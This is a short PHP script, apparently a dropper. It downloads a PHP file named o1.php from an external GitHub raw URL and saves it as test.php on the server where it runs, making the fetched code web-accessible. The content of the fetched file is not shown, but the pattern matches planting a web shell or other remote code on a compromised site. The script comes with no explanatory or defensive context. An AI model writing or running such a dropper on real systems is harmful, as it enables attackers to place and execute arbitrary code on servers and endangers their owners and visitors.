<?php
# https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985
$url = 'https://raw.githubusercontent.com/jytmX/Whatever/master/o1.php';
$response = file_get_contents($url);
if ($response === false) {
    echo 'Error fetching the URL.';
} else {
    $filePath = 'test.php';
    file_put_contents($filePath, $response);
    echo 'Content saved to ' . $filePath;
}
?>
